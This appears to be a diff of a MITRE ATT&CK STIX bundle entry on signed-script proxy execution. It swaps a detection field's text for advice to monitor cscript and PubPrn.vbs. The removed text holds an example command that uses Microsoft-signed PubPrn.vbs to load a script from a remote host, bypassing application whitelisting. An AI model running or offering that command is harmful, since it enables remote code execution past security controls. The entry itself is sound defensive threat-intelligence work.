@@ -1,6 +1,6 @@
 {
     "type": "bundle",
-    "id": "bundle--d6c8b69c-319e-4e08-9f00-8e5c057cf696",
+    "id": "bundle--d4311bac-a650-4695-b214-5a62aad665d7",
     "spec_version": "2.0",
     "objects": [
         {
@@ -41,7 +41,7 @@
             "object_marking_refs": [
                 "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
             ],
-            "x_mitre_detection": "Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.\n\nPubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. (Citation: Enigma0x3 PubPrn Bypass) Example command: <code>cscript C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>\n\nThere are several other signed scripts that may be used in a similar manner. (Citation: GitHub Ultimate AppLocker Bypass List)",
+            "x_mitre_detection": "Monitor script processes, such as cscript, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",
             "x_mitre_platforms": [
                 "Windows"
             ],
